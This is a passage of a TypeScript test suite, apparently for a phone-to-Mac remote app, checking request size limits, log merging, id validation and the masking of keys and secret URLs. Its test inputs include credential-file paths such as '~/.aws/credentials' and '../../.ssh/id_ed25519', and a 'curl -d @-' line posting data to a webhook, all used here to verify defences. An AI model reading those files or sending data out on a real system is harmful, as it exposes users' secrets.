			assert.ok((one.taken ?? ((reply) => reply.result !== undefined))(atTheLimit), `${name}: exactly ${one.max} characters from a phone are taken: ${JSON.stringify(atTheLimit).slice(0, 300)}`);
			if (one.method === "projects.addAgent") helper = { id: atTheLimit.result.id, name: `Bounded ${named}` };
			assert.equal((await ask(one.method, await one.params(refused(one.max + 1), "phone"))).error, over(one.what, one.max, one.max + 1), `${name}: a character over is refused`);
			for (const wrong of [[refused(8)], { text: refused(8) }, 8, true]) assert.equal((await ask(one.method, await one.params(wrong, "phone"))).error, notText(one.what), `${name}: ${JSON.stringify(wrong).slice(0, 20)} is not text`);
			const fromMac = await answerOf(app.call(one.method, await one.params("m".repeat(one.max + 1), "mac")));
			if (one.mac === undefined) assert.ok(fromMac.result !== undefined, `${name}: a character over from the Mac's app is taken: ${JSON.stringify(fromMac).slice(0, 300)}`);
			else assert.match(fromMac.error ?? "", one.mac, `${name}: from the Mac's app, its handler's own answer`);
			if (one.mailbox) {
				const mailed = await leave(phone.item(remote.pairing, one.method, await one.params("l".repeat(one.max), "phone")));
				assert.deepEqual(mailed.reply, { taken: true, outcome: "done" }, `${name}: exactly ${one.max} by mailbox`);
				const mailedOver = await leave(phone.item(remote.pairing, one.method, await one.params(refused(one.max + 1), "phone")));
				assert.deepEqual([mailedOver.reply, mailedOver.receipt.why], [{ taken: true, outcome: "refused" }, over(one.what, one.max, one.max + 1)], `${name}: a character over by mailbox`);
				const mailedWrong = await leave(phone.item(remote.pairing, one.method, await one.params([refused(8)], "phone")));
				assert.deepEqual([mailedWrong.reply, mailedWrong.receipt.why], [{ taken: true, outcome: "refused" }, notText(one.what)], `${name}: a list by mailbox`);
			}
		}
		await app.call("chat.set", { instructions: "" });

		// The rest of a request, counted: each value one, a string its length besides, a key its length. A note of 65,530
		// characters is at the count exactly (the parameters 1, `text` 4, its value 1); the handler's own 400 refuses it.
		assert.equal(MAX_OTHER_FROM_A_DEVICE, 65_536);
		assert.equal(typedRefusal("memory.add", { text: "n".repeat(65_530) }), null);
		assert.equal(typedRefusal("memory.add", { text: "n".repeat(65_531) }), overTheRest);
		assert.equal(typedRefusal("agents.save", { agent: { id: "forge", ["k".repeat(65_536)]: 1 } }), overTheRest, "a key counts");
		let deep: unknown = [];
		for (let level = 0; level < 1_000_000; level++) deep = [deep];
		assert.equal(typedRefusal("conversation.archive", { id: deep }), overTheRest, "a list a million deep, walked without recursion");
		assert.equal(typedRefusal("variables.set", { value: "n".repeat(65_531) }), null, "what no device list holds is the table's to refuse");
		// A row added tomorrow is walked with nobody remembering: every request of both lists, with a field no row names.
		const listed = deviceRequestsListed();
		assert.ok(listed.length > 100 && listed.includes("submit") && listed.includes("schedules.save"), `${listed.length} requests a device may send`);
		for (const method of listed) {
			assert.equal(typedRefusal(method, { namedByNoRow: "n" }), null, method);
			assert.equal(typedRefusal(method, { namedByNoRow: "n".repeat(65_536) }), overTheRest, `${method}: a field no row names is held to the rest's count`);
		}
		for (const [method, params] of [
			["memory.add", { text: refused(65_531) }],
			["conversation.archive", { id: Array.from({ length: 70_000 }, () => 1) }],
			["agents.delete", { id: [refused(40_000), refused(40_000)] }],
			["needs.answer", { id: "no-such", answer: { kind: "decision", choice: refused(70_000) } }],
		] as const) {
			assert.equal((await ask(method, params)).error, overTheRest, `${method}: past the rest's count`);
		}
		// A refusal that repeats what a phone sent cuts it (#940), however it came.
		assert.equal((await ask("inbox.decide", { id: "no-such", decision: `${"d".repeat(60)}${refused(8)}` })).error, ONLY_ON_THE_MAC, "an unknown decision is the table's");
		assert.equal((await answerOf(app.call("inbox.decide", { id: "no-such", decision: `${"d".repeat(60)}${refused(8)}` }))).error, `Unknown decision: ${"d".repeat(59)}…`, "and the Mac's app is told it cut");
		assert.equal((await ask("conversation.pin", { id: `${"c".repeat(60)}${refused(8)}`, pinned: true })).error, `Unknown conversation: ${"c".repeat(59)}…`);
		assert.equal((await ask("conversation.pin", { id: `${"c".repeat(58)}😀${refused(8)}`, pinned: true })).error, `Unknown conversation: ${"c".repeat(58)}…`, "never half a character");
		assert.equal((await ask("needs.answer", { id: "no-such", answer: { kind: `${"k".repeat(60)}${refused(8)}` } })).error, ONLY_ON_THE_MAC, "an unknown kind is the table's");
		assert.match((await answerOf(app.call("needs.answer", { id: "no-such", answer: { kind: `${"k".repeat(60)}${refused(8)}` } }))).error ?? "", new RegExp(`^Unknown kind of answer: k{59}…$`), "from the Mac's app too");

		// A task of 66 MiB, as #924 measured its message: refused for what it costs to carry the line in, no more. The same
		// line refused by the table (variables.set) is the measure.
		const huge = refused(66 * 1024 * 1024);
		const rssOf = async () => Number((await execFileAsync("/bin/ps", ["-o", "rss=", "-p", String(engine.pid)])).stdout.trim()) * 1024;
		const cost = async (id: string, method: string, params: Record<string, unknown>) => {
			const line = `${JSON.stringify({ session, message: { id, method, params } })}\n`;
			const before = await rssOf();
			let peak = before;
			let answered = false;
			const sampled = (async () => {
				while (!answered) peak = Math.max(peak, await rssOf());
			})();
			const sent = performance.now();
			remote.socket.write(line);
			const reply = await until(`the answer to ${id}`, () => remote.sessionLines.get(session)?.find((message) => message.id === id), { over: () => (remote.closed ? "pi² Remote's connection closed" : undefined) });
			const took = performance.now() - sent;
			answered = true;
			await sampled;
			return { reply, took, before, peak };
		};
		const table = await cost("huge-task-table", "variables.set", { agentId: "forge", name: "HUGE", value: huge });
		assert.equal(table.reply.error, ONLY_ON_THE_MAC);
		const hugeItem = (await app.call("work.create", { projectId: made.id, title: "Huge" })).id;
		const sized = await cost("huge-task", "work.act", { projectId: made.id, id: hugeItem, action: "assign", agentId: helper.id, task: huge });
		assert.equal(sized.reply.error, over("A task", 20_000, huge.length), "a task of 66 MiB is refused");
		const mb = (bytes: number) => Math.round(bytes / 1e6);
		console.log(`    66 MiB task: refused by the table in ${Math.round(table.took)} ms (${mb(table.before)} MB, at most ${mb(table.peak)} MB), for its size in ${Math.round(sized.took)} ms (${mb(sized.before)} MB, at most ${mb(sized.peak)} MB)`);
		assert.ok(sized.took <= 3 * table.took + 2_000, `in ${Math.round(sized.took)} ms, where the same line refused by the table took ${Math.round(table.took)} ms`);
		const grew = (one: { before: number; peak: number }) => one.peak - one.before;
		assert.ok(grew(sized) <= grew(table) + 2 * huge.length, `with the engine grown by ${mb(grew(sized))} MB, where the table's refusal grew it by ${mb(grew(table))} MB`);
		// The same in fields the devices' log's summary reads (#940's security read): a refused request is summarized by its
		// method alone, so nothing cleans, masks or splits the title or the path first. Held closer than the task, since a
		// summary made from them took seconds and grew the engine by gigabytes.
		const { id: renamed } = (await ask("conversation.create", { model: demo })).result;
		for (const [what, method, params] of [
			["title", "conversation.rename", { id: renamed, title: huge }],
			["path", "files.preview", { id: renamed, path: "/ŧ".repeat(huge.length / 2) }],
		] as const) {
			const read = await cost(`huge-${what}`, method, params);
			assert.equal(read.reply.error, overTheRest, `a ${what} of 66 MiB is past the rest's count`);
			console.log(`    66 MiB ${what}: refused in ${Math.round(read.took)} ms (${mb(read.before)} MB, at most ${mb(read.peak)} MB)`);
			assert.ok(read.took <= 2 * table.took + 1_000, `in ${Math.round(read.took)} ms, where the same line refused by the table took ${Math.round(table.took)} ms`);
			assert.ok(grew(read) <= grew(table) + huge.length, `with the engine grown by ${mb(grew(read))} MB, where the table's refusal grew it by ${mb(grew(table))} MB`);
			const entry = (await app.call("devices.log", { device: phone.id })).entries.find((one: any) => one.method === method && one.why === overTheRest);
			assert.equal(entry?.summary, `${method}: refused for the text it carries`, `logged by its method alone: ${JSON.stringify(entry).slice(0, 200)}`);
		}
		const hugeParams = { projectId: made.id, id: hugeItem, action: "assign", agentId: helper.id, task: huge };
		const heapBefore = process.memoryUsage().heapUsed;
		const checkedIn = performance.now();
		assert.equal(typedRefusal("work.act", hugeParams), over("A task", 20_000, huge.length));
		const checking = performance.now() - checkedIn;
		assert.ok(checking < 50 && process.memoryUsage().heapUsed - heapBefore < 1024 * 1024, `the check itself took ${checking.toFixed(2)} ms`);
		assert.ok((await ask("engine.info")).result !== undefined, "the session goes on");

		// Nothing of a refused text anywhere: the devices' log keeps the sentence, engine.log and the engine's files nothing.
		const mark = refused(8);
		const logged = (await app.call("devices.log", { device: phone.id })).entries;
		assert.ok(logged.some((entry: any) => entry.method === "work.act" && entry.outcome === "refused" && entry.why === over("A task", 20_000, 20_001)), "refused in the devices' log, with its sentence");
		assert.ok(!JSON.stringify(logged).includes(mark), "the devices' log holds nothing of a refused text");
		assert.ok(!engineLog.slice(logFrom).includes(mark), "nor engine.log");
		const keptIn = (text: string) =>
			execFileAsync("/usr/bin/grep", ["-rlF", "-D", "skip", text, home], { env: { ...process.env, LC_ALL: "C" } }).then(
				({ stdout }) => stdout,
				(error: { code?: number; stdout?: string }) => (error.code === 1 ? "" : `grep failed: ${error.code} ${error.stdout}`),
			);
		assert.notEqual(await keptIn("l".repeat(200)), "", "where what was taken is found");
		assert.equal(await keptIn(mark), "", "nor any file the engine keeps");
		step(
			`a phone's other texts: ${cases.length} bounded fields, each exactly at its bound taken, a character over refused with what to do, a list, an object, a number and true refused as not text, a request id by mailbox too; the same over from the Mac's app taken (or its handler's own answer); the rest of a request at most ${MAX_OTHER_FROM_A_DEVICE.toLocaleString("en-US")} characters; a repeated value cut; a 66 MiB task refused in ${Math.round(sized.took)} ms (the table's refusal, ${Math.round(table.took)} ms); nothing of a refused text in the devices' log, engine.log or a file`,
		);
	}

	// ---- The devices' log and the masks, hardened before a real phone is paired (#997)
	{
		// The log's cleaner is the push's (`unhidden`): the security read of #950's characters, which split a key out of the
		// masks' sight, are taken out, and a line or paragraph separator is a space, as a line break is.
		const body = "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8";
		const splitters: [string, string][] = [
			["U+FE0F, a variation selector", "\uFE0F"],
			["U+FE00, a variation selector", "\uFE00"],
			["U+E0100, a variation selector", "\u{E0100}"],
			["U+034F, the combining grapheme joiner", "\u034F"],
			["U+3164, a Hangul filler", "\u3164"],
			["U+FFA0, a halfwidth Hangul filler", "\uFFA0"],
			["U+115F, a Hangul choseong filler", "\u115F"],
			["U+180B, a Mongolian variation selector", "\u180B"],
		];
		for (const [what, character] of splitters) {
			const split = `ghp_${body.slice(0, 18)}${character}${body.slice(18)}`;
			assert.equal(summarize("conversation.rename", { title: split }), `Renamed a conversation to “${KEY_HIDDEN}”`, `${what} splits no key out of the masks' sight`);
			assert.equal(summarize("conversation.rename", { title: `a${character}b` }), "Renamed a conversation to “ab”", `${what} is taken out`);
		}
		assert.equal(summarize("conversation.rename", { title: "one\u2028two\u2029three" }), "Renamed a conversation to “one two three”", "a line or paragraph separator is a space");
		const { shown: pushed } = await import("../src/pushes.ts");
		for (const [what, character] of splitters) assert.equal(pushed(`a${character}b`, 100).text, "ab", `a push takes out ${what} too: one set`);
		assert.equal(pushed("one\u2028two", 100).text, "one\ntwo", "and keeps its lines");

		// The log of a store of this test's own, for what only logDevice decides.
		const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "log997-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
		await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
		const stored = async () => {
			await flushDeviceLog();
			return (await harness.snapshot(DeviceLog, context))!.entries;
		};
		// A summary made outside `summarize` ("Pairing of … taken back") is cleaned and masked as every other is.
		const cleanedDevice = `dev_${b64url(randomBytes(16))}`;
		await logDevice({ device: cleanedDevice, path: "relay", method: "pair", summary: `Pairing of “ghp_${body.slice(0, 18)}\uFE0F${body.slice(18)}\u202E” taken back`, presence: false, outcome: "failed", why: "pi² Remote could not keep the pairing on this Mac." });
		const cleaned = (await stored()).find((entry) => entry.device === cleanedDevice)!;
		assert.equal(cleaned.summary, `Pairing of “${KEY_HIDDEN}” taken back`, "a summary made outside summarize is cleaned, then masked");

		// 2,000 refusals and failures in two minutes, sizes and words varying, by a live session and by mailbox: one entry a
		// minute for each request and kind, with a count and the last time, and the device's own files shown all stay.
		const device = `dev_${b64url(randomBytes(16))}`;
		const base = Date.now() - 130_000;
		for (let i = 0; i < 5; i++) await logDevice({ device, path: "relay", method: "files.preview", summary: `Showed the file “notes-${i}.md”`, presence: true, outcome: "done", at: base + i });
		const flooding = [
			// Each as deviceRequest and checkRequestItem summarize it: the same request about the same thing, again and again.
			(i: number) => ({ path: "relay" as const, method: "submit", summary: "submit: refused for the text it carries", outcome: "refused" as const, why: `A message from a phone can carry at most 1 MB of typed text; this one has ${i % 2 === 0 ? "just over 1 MB" : `${(1.1 + i / 1e4).toFixed(1)} MB`}. Shorten it, or send it from the Mac.` }),
			(i: number) => ({ path: "relay" as const, method: "work.act", summary: "work.act: refused for the text it carries", outcome: "refused" as const, why: `A task from a phone can be at most 20,000 characters; this one has ${(20_001 + i).toLocaleString("en-US")}. Shorten it, or do this on the Mac.` }),
			(i: number) => ({ path: "relay" as const, method: "files.preview", summary: "Showed the file “flood.md”", outcome: "failed" as const, why: i % 3 === 2 ? TOO_MANY_PREVIEWS : `Unknown conversation: ${i}` }),
			(_: number) => ({ path: "mailbox" as const, method: "submit", summary: "Sent a message in “Plans”", outcome: "refused" as const, why: "The item's presence signature is not the presence key's." }),
		];
		const flood = 2_000;
		for (let i = 0; i < flood; i++) await logDevice({ device, presence: false, at: base + 10 + i * 60, ...flooding[i % flooding.length]!(i) });
		let mine = (await stored()).filter((entry) => entry.device === device);
		const floodEntries = mine.filter((entry) => entry.outcome !== "done");
		assert.deepEqual(mine.filter((entry) => entry.outcome === "done").map((entry) => entry.summary), [0, 1, 2, 3, 4].map((i) => `Showed the file “notes-${i}.md”`), "the device's own files shown all stay");
		assert.equal(floodEntries.reduce((sum, entry) => sum + (entry.count ?? 1), 0), flood, "every refusal and failure is counted");
		assert.ok(floodEntries.length <= flooding.length * 3, `${flood} refusals and failures in two minutes are ${floodEntries.length} entries: ${JSON.stringify(floodEntries.map((entry) => [entry.method, entry.count])).slice(0, 300)}`);
		assert.ok(floodEntries.every((entry) => entry.count === undefined || (entry.lastAt! > entry.at && entry.lastAt! <= base + 10 + flood * 60)), "each with the last time");
		for (const kind of flooding) assert.ok(floodEntries.some((entry) => entry.method === kind(0).method && entry.path === kind(0).path && entry.outcome === kind(0).outcome && (entry.count ?? 1) > 100), `merged: ${JSON.stringify(kind(0)).slice(0, 80)}`);
		assert.equal(floodEntries.find((entry) => entry.method === "files.preview")?.why, TOO_MANY_PREVIEWS, "a merged entry keeps the first one's words");
		// Only the same request about the same thing merges (#1015's security read): five files a phone failed to be shown
		// are five entries, each its own, never one that reads as five tries of the first; the same file five times is one
		// of five; so are refusals that name different things (two titles).
		const asked = `dev_${b64url(randomBytes(16))}`;
		const paths = ["notes.md", "evil\u202Etxt.md", "../../.ssh/id_ed25519", "~/.aws/credentials", ".env"];
		for (const path of paths) await logDevice({ device: asked, path: "relay", method: "files.preview", summary: summarize("files.preview", { path }), presence: true, outcome: "failed", why: NOT_LINKED });
		for (let i = 0; i < 5; i++) await logDevice({ device: asked, path: "relay", method: "files.preview", summary: summarize("files.preview", { path: "same.md" }), presence: true, outcome: "failed", why: NOT_LINKED });
		for (const title of ["First title", "Second title"]) await logDevice({ device: asked, path: "mailbox", method: "conversation.rename", summary: summarize("conversation.rename", { title }), presence: false, outcome: "refused", why: ONLY_ON_THE_MAC });
		const askedEntries = (await stored()).filter((entry) => entry.device === asked).map((entry) => `${entry.summary}${entry.count === undefined ? "" : ` ×${entry.count}`}`);
		assert.deepEqual(
			askedEntries,
			[
				...["notes.md", "eviltxt.md", "../../.ssh/id_ed25519", "~/.aws/credentials", ".env"].map((path) => `Showed the file “${path}”`),
				"Showed the file “same.md” ×5",
				"Renamed a conversation to “First title”",
				"Renamed a conversation to “Second title”",
			],
			"each thing asked for its own entry; the same thing again, one",
		);

		// Refusals in 2,500 words of their own, which nothing merges: they push out only one another, past half the share.
		const words = (i: number) => [...i.toString(26)].map((digit) => String.fromCharCode(97 + Number.parseInt(digit, 26))).join("");
		for (let i = 0; i < 2_500; i++) await logDevice({ device, path: "relay", method: "variables.set", summary: "variables.set", presence: true, outcome: "refused", why: `Refused for ${words(i)}`, at: base + 200_000 + i });
		mine = (await stored()).filter((entry) => entry.device === device);
		assert.equal(mine.filter((entry) => entry.outcome === "done").length, 5, "2,500 refusals in words of their own push out no file shown");
		assert.equal(mine.length, 2_000, "and the device keeps its share of 2,000");
		assert.ok(mine.some((entry) => entry.why === `Refused for ${words(2_499)}`) && !mine.some((entry) => entry.why === `Refused for ${words(0)}`), "the newest refusals, the oldest gone first");
		// And the reverse: what the device did pushes out no more than half its share of refusals.
		for (let i = 0; i < 2_500; i++) await logDevice({ device, path: "relay", method: "submit", summary: `Sent a message ${i}`, presence: true, outcome: "done" });
		mine = (await stored()).filter((entry) => entry.device === device);
		assert.deepEqual([mine.filter((entry) => entry.outcome === "done").length, mine.filter((entry) => entry.outcome !== "done").length], [1_000, 1_000], "each side keeps its newest half");
		await harness.close(context);

		// The ends rule from a value's first window that is no common beginning (the owner's decision of 24 November): a URL
		// in a variable hides no other link, and leaves an approval with a URL answerable, while the value itself, whole or
		// cut by a tool, is still hidden.
		forgetEverySecret();
		const hook = "https://example.com/hook/abcdef123456";
		knowSecrets("variables/hooks", [hook]);
		const links = "curl https://github.com/KellamA/pi2/pull/997 and see https://docs.github.com/en/rest, http://localhost:3000/";
		assert.equal(maskKeys(links), links, "other https:// links show on a phone");
		assert.equal(maskKeys("see https://example.com/docs"), `see https://${SECRET_HIDDEN}`, "while one to the same host, which begins as the value does after its scheme, is hidden (a host stays over-masked)");
		assert.equal(hidesSomething({ kind: "approval", id: "a-997", call: { name: "bash", arguments: { command: links } } }), false, "an approval with a URL is answerable on the phone");
		const secretPart = (text: string) => windows(text, hook.slice("https://".length)).length > 0;
		for (const [what, text] of [
			["whole", `curl -d @- ${hook}`],
			["cut in the middle by a tool", `posted to ${hook.slice(0, 24)}… [13 characters left out]`],
			["cut at its front", `…${hook.slice(14)} done`],
			["in JSON", JSON.stringify({ url: hook })],
		] as const) {
			assert.ok(!secretPart(maskKeys(text)), `the value ${what} is hidden: ${maskKeys(text)}`);
			assert.ok(secretPart(text), `(it was there: ${what})`);
		}
		assert.equal(maskKeys(`curl ${hook}`), `curl ${SECRET_HIDDEN}`);
		assert.equal(hidesSomething({ kind: "approval", id: "a-997", call: { name: "bash", arguments: { command: `curl ${hook}` } } }), true, "and an approval with it is still the Mac's to allow");
		assert.equal(maskKeys("see example.com/hook/abc"), `see ${SECRET_HIDDEN}`, "its head after the scheme still counts anywhere");
		forgetEverySecret();
		// A value that is nothing but a common beginning holds nothing to hide: not looked for.
		knowSecrets("variables/short", ["https://", "https://www."]);
		assert.equal(secretCount(), 0, "nothing but a common beginning is not looked for");
		// One with fewer than 8 after it is hidden where it stands whole, as before (#1015's read); other links show.
		const shortOnes = ["redis://:p4ss@h", "https://www.a1b2.io", "postgres://a1b2c3d", "www.a1b2c3d"];
		knowSecrets("variables/short", shortOnes);
		for (const value of shortOnes) {
			assert.equal(maskKeys(`connect ${value} now`), `connect ${SECRET_HIDDEN} now`, `${value}, whole, is hidden`);
			assert.equal(maskKeys(`before${value}`), `before${SECRET_HIDDEN}`, `${value}, whole at a text's end`);
		}
		const others = "see https://www.a1b2.org, redis://:p4ss@other and https://github.com";
		assert.equal(maskKeys(others), others, "while other links of their schemes show");
		forgetEverySecret();
		// The cost of skipping a common beginning, as the docs say: a cut before the head shows the beginning and up to 7
		// characters after it.
		knowSecrets("variables/database", ["postgres://u:s3cr3tPw@db.internal:5432/app"]);
		assert.equal(maskKeys("postgres://u:s3cr3"), "postgres://u:s3cr3", "7 characters after the scheme show at a cut");
		assert.equal(maskKeys("postgres://u:s3cr3t"), `postgres://${SECRET_HIDDEN}`, "and no more");
		forgetEverySecret();
		knowSecrets("variables/short", ["https://www.a1b2c3d4"]);
		assert.equal(maskKeys("open https://www.a1b2c3d4 now, and https://www.other.io"), `open ${SECRET_HIDDEN} now, and https://www.other.io`, "eight after it are");
		forgetEverySecret();

		// A text that ends partway into a key (#965's read: up to 29 of a `ghp_` key's 36 shown while it streamed): hidden
		// from its prefix to the end, only at the very end and only after a prefix the masks know.
		const ghp = `ghp_${body}`;
		for (let n = 0; n <= body.length; n++) assert.equal(maskKeys(`token ${ghp.slice(0, 4 + n)}`), `token ${KEY_HIDDEN}`, `a text that ends ${n} characters into a key`);
		assert.equal(maskKeys(`token ${ghp.slice(0, 20)} and more`), `token ${ghp.slice(0, 20)} and more`, "not before the text's end");
		assert.equal(maskKeys("pass the flag sk-"), `pass the flag ${KEY_HIDDEN}`, "a text that merely ends in a prefix shows the mark for it");
		assert.equal(maskKeys("ask the desk-"), "ask the desk-", "but not a word's end");
		assert.equal(maskKeys("posted to https://hooks.slack.com/services/T0"), `posted to https://hooks.slack.com/services/${KEY_HIDDEN}`, "a webhook's address keeps its prefix");
		assert.equal(maskKeys("see https://hooks.slack.com/services/"), "see https://hooks.slack.com/services/", "and with nothing after it, hides nothing");
		// Only a prefix that starts a word (#1015's read): the end of `risk_test_` or `taxai-` is a word's, not a key's.
		for (const word of ["the risk_test_", "a taxai-", "snake_ghp_abc", "x9ghp_abc"]) assert.equal(maskKeys(word), word, `${word}: a word's end`);
		for (const [text, shown] of [
			[`\u001b[32m${ghp.slice(0, 12)}`, `\u001b[32m${KEY_HIDDEN}`],
			[`GH_TOKEN=${ghp.slice(0, 12)}`, `GH_TOKEN=${KEY_HIDDEN}`],
			[`(${ghp.slice(0, 12)}`, `(${KEY_HIDDEN}`],
			[ghp.slice(0, 12), KEY_HIDDEN],
		]) {
			assert.equal(maskKeys(text), shown, `${JSON.stringify(text)}: a key's start`);
		}
		step(
			"the devices' log: the push's cleaner (variation selectors, U+034F, Hangul fillers out; separators spaces), in every summary; 2,000 refusals and failures in two minutes made a handful of entries with counts, the device's files shown kept, and refusals in words of their own pushing out only one another; a URL in a variable hides no other link; a text ending partway into a key hides it",
		);
	}

	// ---- From the phone (#997): refusals that carry a size, and failures in words of their own, merge in the log; an id
	// that is no number or short text is refused before anything is done with its line
	{
		const logged = async () => (await app.call("devices.log", { device: phone.id })).entries as DeviceLogEntryLike[];
		type DeviceLogEntryLike = { method: string; outcome: string; why?: string; count?: number; at: number; lastAt?: number };
		const counted = (entries: DeviceLogEntryLike[], method: string, outcome: string, why: (text: string) => boolean) => {
			const mine = entries.filter((entry) => entry.method === method && entry.outcome === outcome && why(entry.why ?? ""));
			return { entries: mine.length, count: mine.reduce((sum, entry) => sum + (entry.count ?? 1), 0) };
		};
		const compacting = (text: string) => text.startsWith("Instructions for compacting from a phone can be at most 20,000 characters; this one has ");
		const pinning = (text: string) => text.startsWith("Unknown conversation: ");
		const before = await logged();
		const { id: compacted } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
		const times = 30;
		for (let i = 0; i < times; i++) {
			assert.match((await ask("conversation.compact", { id: compacted, instructions: "i".repeat(20_001 + i) })).error ?? "", /this one has 20,0\d\d/);
			assert.equal((await ask("conversation.pin", { id: `no-such-${i}`, pinned: true })).error, `Unknown conversation: no-such-${i}`);
		}
		const after = await logged();
		for (const [what, method, outcome, why] of [
			["refusals for their size", "conversation.compact", "refused", compacting],
			["failures in words of their own", "conversation.pin", "failed", pinning],
		] as const) {
			const was = counted(before, method, outcome, why);
			const is = counted(after, method, outcome, why);
			assert.equal(is.count - was.count, times, `${times} ${what}, counted`);
			assert.ok(is.entries - was.entries <= 2, `in ${is.entries - was.entries} new entries (a minute's)`);
		}

		// The id: a whole number or a text of at most 64 characters; anything else is answered with none and a fixed
		// sentence, and the line goes no further (the request is neither handled nor logged).
		const lineWith = async (message: Record<string, unknown>) => {
			const from = remote.sessionLines.get(session)!.length;
			remote.socket.write(`${JSON.stringify({ session, message })}\n`);
			return until("the answer to a line", () => remote.sessionLines.get(session)!.slice(from).find((line) => line.event === undefined), { over: () => (remote.closed ? "pi² Remote's connection closed" : undefined) });
		};
		for (const id of [7, "i".repeat(64), "", 0]) assert.deepEqual(Object.keys((await lineWith({ id, method: "engine.info" })) ?? {}).sort(), ["id", "result"], `an id of ${JSON.stringify(id).slice(0, 20)} is taken`);
		assert.equal((await lineWith({ id: 8, method: "engine.info" })).id, 8);
		const notes = async () => counted(await logged(), "memory.add", "done", () => true).count + counted(await logged(), "memory.add", "failed", () => true).count;
		const notesBefore = await notes();
		for (const id of ["i".repeat(65), [1], { id: 1 }, 1.5, true, 2 ** 60]) {
			assert.deepEqual(await lineWith({ id, method: "memory.add", params: { text: "by an id refused" } }), { id: null, error: NOT_AN_ID }, `an id of ${JSON.stringify(id).slice(0, 20)}`);
		}
		assert.equal(await notes(), notesBefore, "nothing was done with them");
		// An id of 66 MiB, as #940 measured its texts: refused in about the time the line takes to come in, and with no
		// more memory than the table's refusal of the same line (variables.set), which reads nothing of it.
		const huge = "ı".repeat(66 * 1024 * 1024);
		const rssOf = async () => Number((await execFileAsync("/bin/ps", ["-o", "rss=", "-p", String(engine.pid)])).stdout.trim()) * 1024;
		const cost = async (message: Record<string, unknown>) => {
			const before = await rssOf();
			let peak = before;
			let answered = false;
			const sampled = (async () => {
				while (!answered) peak = Math.max(peak, await rssOf());
			})();
			const sent = performance.now();
			const reply = await lineWith(message);
			const took = performance.now() - sent;
			answered = true;
			await sampled;
			return { reply, took, grew: peak - before };
		};
		const table = await cost({ id: "huge-id-table", method: "variables.set", params: { agentId: "forge", name: "HUGE", value: huge } });
		assert.deepEqual(table.reply, { id: "huge-id-table", error: ONLY_ON_THE_MAC });
		const logFrom = engineLog.length;
		const sized = await cost({ id: huge, method: "memory.add", params: { text: "by a huge id" } });
		assert.deepEqual(sized.reply, { id: null, error: NOT_AN_ID }, "an id of 66 MiB is refused");
		const mb = (bytes: number) => Math.round(bytes / 1e6);
		console.log(`    66 MiB id: refused in ${Math.round(sized.took)} ms, grown ${mb(sized.grew)} MB (the table's refusal of the same line: ${Math.round(table.took)} ms, ${mb(table.grew)} MB)`);
		assert.ok(sized.took <= 3 * table.took + 2_000, `in ${Math.round(sized.took)} ms, where the same line refused by the table took ${Math.round(table.took)} ms`);
		// What is done with the id, rather than the memory, which depends on what earlier lines left on the heap (#1015's
		// read): it is never echoed (before, each reply serialized, parsed and masked it, and pi² Remote got no answer at
		// all, the line too long to send), and nothing of it is logged, below.
		assert.ok(JSON.stringify(sized.reply).length < 200, `the answer is ${JSON.stringify(sized.reply).length} characters`);
		const mark = "ı".repeat(16);
		assert.ok(!JSON.stringify(await logged()).includes(mark), "nothing of it in the devices' log");
		assert.ok(!engineLog.slice(logFrom).includes(mark), "nor in engine.log");
		assert.equal(await notes(), notesBefore, "and nothing was done with it");
		assert.ok((await ask("engine.info")).result !== undefined, "the session goes on");
		step(`from the phone: ${times} refusals for their size and ${times} failures in words of their own each a minute's entry with a count; an id that is no whole number or text of at most 64 characters (a longer text, a list, an object, a fraction, true) refused with none, before its line is handled; one of 66 MiB in ${Math.round(sized.took)} ms (the table's refusal, ${Math.round(table.took)} ms)`);
	}

	// ---- A picture whose base64 holds a key-shaped run comes back to the phone byte for byte (#956)
	{
		// Noise, as a photo's base64 is, around `AIza` and 35 letters and digits (3 bytes to 4 characters: no padding).
		{
			const noise = randomBytes(3 * 90_000).toString("base64");
			const data = pad(`iVBORw0KGgoAAAANSUhEUg${noise.slice(0, 1000)}/${AIZA_RUN}+${noise.slice(1000)}`);
			const { id: noisyChat } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
			await ask("conversation.open", { id: noisyChat });
			const before = remote.sessionLines.get(session)!.length;
			assert.ok((await ask("submit", { id: noisyChat, text: "A noisy picture", attachments: [{ kind: "image", name: "noise.png", mimeType: "image/png", data }] })).result !== undefined);
			const entry = await until("the picture's entry on the phone", () =>
				remote.sessionLines.get(session)!.slice(before).flatMap((line) => (line.event === "conversation" && line.id === noisyChat ? line.items : [])).find((item: any) => item.kind === "user" && item.images === 1),
			);
			const shown = await ask("conversation.image", { id: noisyChat, entryId: entry.id, index: 0 });
			assert.equal(shown.result.mimeType, "image/png");
			assert.ok(shown.result.data === data, `byte for byte: ${shown.result.data.length} characters of ${data.length}`);
			assert.deepEqual(await app.call("conversation.image", { id: noisyChat, entryId: entry.id, index: 0 }), { data, mimeType: "image/png" }, "as the Mac's app gets it");
			// The same run typed into a command is still masked, on the same session.
			await ask("submit", { id: noisyChat, text: `echo ${AIZA_RUN}` });
			await until("the typed run, masked", () => remote.sessionLines.get(session)!.slice(before).some((line) => line.event === "conversation" && line.id === noisyChat && JSON.stringify(line).includes(`echo ${KEY_HIDDEN}`)));
			assert.ok(!JSON.stringify(remote.sessionLines.get(session)!.slice(before).filter((line) => line.event === "conversation")).includes(AIZA_RUN), "never whole in a transcript line");
		}
		step("a picture whose base64 holds a key-shaped run comes back to the phone byte for byte from conversation.image, as to the Mac's app; the same run typed is still masked");
	}

	// ---- A typed text over 64 MiB (#919), which since #924 only the Mac's own app may send: taken, and its echo to a
	// phone's session that has the conversation open never written to pi² Remote, which takes 64 MiB at most
	{
		// Another device's session beside it, which must not notice.
		const other = new Phone("Jo's iPhone");
		({ device: other.id } = await app.call("devices.pairConfirm", { digits: (await claimIn(other)).digits }));
		const otherChallenge = (await remote.call("remote.attachBegin")).result.challenge;
		const otherBinding = randomBytes(32);
		const otherSession = (await remote.call("remote.attach", { attach: other.attach({ pairing: remote.pairing, challenge: otherChallenge, binding: otherBinding }), binding: b64url(otherBinding), path: "relay" })).result.session as string;
		await until("the other device's greeting", () => remote.sessionLines.get(otherSession)?.some((line) => line.event === "device"));
		// The demo model answers `/work 0` with a line of its own, without quoting the text.
